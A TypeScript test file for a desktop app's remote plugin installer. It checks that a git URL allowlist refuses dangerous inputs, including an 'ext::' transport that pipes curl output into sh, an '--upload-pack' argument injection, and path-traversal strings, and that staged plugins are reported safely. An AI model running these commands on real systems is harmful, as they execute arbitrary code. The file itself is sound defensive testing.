import { describe, it, expect, vi, beforeEach } from 'vitest'
import { mkdtempSync, writeFileSync, mkdirSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'

vi.mock('electron', () => ({
  app: { getPath: () => mkdtempSync(join(tmpdir(), 'duin-staging-root-')) },
  BrowserWindow: { getAllWindows: () => [] }
}))

import { isAllowedRepoUrl, inspectStaged, stagedPath } from './plugin-install-remote'
import { clearRequirementCache } from './capability-requires'

beforeEach(() => clearRequirementCache())

const scratch = (): string => mkdtempSync(join(tmpdir(), 'duin-staged-'))

// ─────────────────────────── the security boundary ───────────────────────────
//
// `git clone` executes code on the CLONING machine for two whole families of URL,
// and this is the only thing standing in front of it. Nothing below is style
// checking — each rejected case is remote code execution if it gets through.

describe('isAllowedRepoUrl', () => {
  it('accepts an ordinary https repository', () => {
    const r = isAllowedRepoUrl('https://github.com/owner/repo.git')
    expect(r.ok).toBe(true)
  })

  it('accepts scp-style ssh shorthand', () => {
    expect(isAllowedRepoUrl('git@github.com:owner/repo.git').ok).toBe(true)
  })

  it('accepts ssh://', () => {
    expect(isAllowedRepoUrl('ssh://git@github.com/owner/repo.git').ok).toBe(true)
  })

  // `git clone "ext::sh -c 'curl evil.sh|sh'"` runs a shell command by design.
  // No repository is involved at all.
  it('REFUSES ext:: — it runs a shell command', () => {
    const r = isAllowedRepoUrl("ext::sh -c 'curl evil|sh'")
    expect(r.ok).toBe(false)
    expect(r.ok === false && r.error).toMatch(/shell command/i)
  })

  it('REFUSES ext:: regardless of case', () => {
    expect(isAllowedRepoUrl('EXT::whatever').ok).toBe(false)
  })

  // execFile passes argv without a shell, which stops metacharacters — but does NOT
  // stop an argument being parsed as a FLAG. `--upload-pack=<cmd>` runs that command.
  it('REFUSES a leading dash — git would read it as an option', () => {
    expect(isAllowedRepoUrl('--upload-pack=touch /tmp/pwned').ok).toBe(false)
    expect(isAllowedRepoUrl('-u touch /tmp/pwned').ok).toBe(false)
  })

  it('REFUSES file:// and local paths — that is what the directory picker is for', () => {
    expect(isAllowedRepoUrl('file:///etc/passwd').ok).toBe(false)
    expect(isAllowedRepoUrl('C:\\Windows\\System32').ok).toBe(false)
    expect(isAllowedRepoUrl('../../../etc').ok).toBe(false)
  })

  it('REFUSES http:// — plaintext transport for code we are about to run', () => {
    expect(isAllowedRepoUrl('http://example.com/repo.git').ok).toBe(false)
  })

  it('REFUSES other schemes outright, because the allowlist is the point', () => {
    for (const u of ['git://example.com/r.git', 'ftp://x/y', 'javascript:alert(1)']) {
      expect(isAllowedRepoUrl(u).ok, u).toBe(false)
    }
  })

  it('REFUSES empty and whitespace', () => {
    expect(isAllowedRepoUrl('').ok).toBe(false)
    expect(isAllowedRepoUrl('   ').ok).toBe(false)
  })

  it('trims, so a pasted URL with stray whitespace still works', () => {
    const r = isAllowedRepoUrl('  https://github.com/o/r.git  ')
    expect(r.ok && r.url).toBe('https://github.com/o/r.git')
  })
})

describe('stagedPath — a stageId arrives over IPC', () => {
  it('refuses anything that is not a plain uuid, so it cannot name another directory', () => {
    expect(stagedPath('../../plugins')).toBeNull()
    expect(stagedPath('..')).toBeNull()
    expect(stagedPath('C:\\Windows')).toBeNull()
    expect(stagedPath('')).toBeNull()
    // Right shape, but nothing staged under it.
    expect(stagedPath('3f2504e0-4f89-11d3-9a0c-0305e82c3301')).toBeNull()
  })
})

// ─────────────────────────── the review report ───────────────────────────

describe('inspectStaged', () => {
  const plugin = (files: Record<string, string>): string => {
    const dir = scratch()
    for (const [rel, content] of Object.entries(files)) {
      const full = join(dir, rel)
      mkdirSync(join(full, '..'), { recursive: true })
      writeFileSync(full, content)
    }
    return dir
  }

  it('refuses a repo with no plugin.json rather than installing something arbitrary', () => {
    const dir = plugin({ 'README.md': 'hi' })
    const r = inspectStaged(dir, 'sid', 'https://x/y', new Set())
    expect('error' in r && r.error).toMatch(/plugin\.json/)
  })

  it('refuses an unparseable manifest', () => {
    const dir = plugin({ 'plugin.json': '{ not json' })
    expect('error' in inspectStaged(dir, 'sid', 'https://x/y', new Set())).toBe(true)
  })

  it('refuses an id that is not a safe directory name', () => {
    const dir = plugin({ 'plugin.json': JSON.stringify({ id: '../escape', name: 'x' }) })
    const r = inspectStaged(dir, 'sid', 'https://x/y', new Set())
    expect('error' in r && r.error).toMatch(/valid "id"/)
  })

  it('reports the command line VERBATIM — the operator approves that exact string', () => {
    const dir = plugin({
      'plugin.json': JSON.stringify({ id: 'demo', name: 'Demo', version: '1.0.0' }),
      'connectors.json': JSON.stringify([
        { id: 'c1', name: 'Thing', transport: 'stdio', command: 'npx', args: ['-y', 'evil-pkg'] }
      ])
    })
    const r = inspectStaged(dir, 'sid', 'https://x/y', new Set())
    expect('error' in r).toBe(false)
    if ('error' in r) return
    expect(r.connectors[0].commandLine).toBe('npx -y evil-pkg')
  })

  it('lists env KEYS but never their values — a repo can ship a credential', () => {
    const dir = plugin({
      'plugin.json': JSON.stringify({ id: 'demo', name: 'Demo' }),
      'connectors.json': JSON.stringify([
        {
          id: 'c1',
          transport: 'stdio',
          command: 'node',
          env: { API_TOKEN: 'sk-leaked-secret-value' }
        }
      ])
    })
    const r = inspectStaged(dir, 'sid', 'https://x/y', new Set())
    if ('error' in r) throw new Error(r.error)
    expect(r.connectors[0].envKeys).toEqual(['API_TOKEN'])
    expect(JSON.stringify(r)).not.toContain('sk-leaked-secret-value')
  })

  // Hiding it would be the worst outcome: the operator would approve a plugin whose
  // spawn list rendered as empty while mcp-manager might still read the file.
  it('SURFACES an unparseable connectors.json rather than showing an empty spawn list', () => {
    const dir = plugin({
      'plugin.json': JSON.stringify({ id: 'demo', name: 'Demo' }),
      'connectors.json': '[ broken'
    })
    const r = inspectStaged(dir, 'sid', 'https://x/y', new Set())
    if ('error' in r) throw new Error(r.error)
    expect(r.connectors).toHaveLength(1)
    expect(r.connectors[0].name).toMatch(/could not be parsed/i)
  })

  it('probes the plugin’s own requirements against this machine', () => {
    const dir = plugin({
      'plugin.json': JSON.stringify({
        id: 'demo',
        name: 'Demo',
        requires: [{ kind: 'binary', name: 'definitely-absent-xyz', hint: 'Install it.' }]
      })
    })
    const r = inspectStaged(dir, 'sid', 'https://x/y', new Set())
    if ('error' in r) throw new Error(r.error)
    expect(r.missing).toHaveLength(1)
    expect(r.missing[0].detail).toBe('Install it.')
  })

  it('flags an id collision at REVIEW time, not after the clone succeeded', () => {
    const dir = plugin({ 'plugin.json': JSON.stringify({ id: 'demo', name: 'Demo' }) })
    const r = inspectStaged(dir, 'sid', 'https://x/y', new Set(['demo']))
    if ('error' in r) throw new Error(r.error)
    expect(r.alreadyInstalled).toBe(true)
  })

  it('lists skills and slash-commands so a text-only plugin reads as text-only', () => {
    const dir = plugin({
      'plugin.json': JSON.stringify({ id: 'demo', name: 'Demo' }),
      'skills/one.md': '---\nname: one\n---\nx',
      'skills/two.md': '---\nname: two\n---\nx',
      'slash-commands/go.md': 'x'
    })
    const r = inspectStaged(dir, 'sid', 'https://x/y', new Set())
    if ('error' in r) throw new Error(r.error)
    expect(r.skills).toEqual(['one.md', 'two.md'])
    expect(r.slashCommands).toEqual(['go.md'])
    expect(r.connectors).toEqual([])
  })
})
